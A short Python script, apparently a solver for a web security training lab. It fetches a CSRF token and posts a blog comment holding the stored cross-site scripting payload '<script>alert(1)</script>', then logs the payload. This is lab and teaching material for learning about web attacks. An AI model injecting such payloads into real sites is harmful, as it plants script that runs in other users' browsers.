from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "<script>alert(1)</script>"

    csrf = session.get_csrf_token("/post?postId=1")
    data = {
        "csrf": csrf,
        "postId": 1,
        "comment": xss,
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }
    session.post_path("/post/comment", data=data)
    logger.info("Commented the following payload:")
    logger.info(xss)
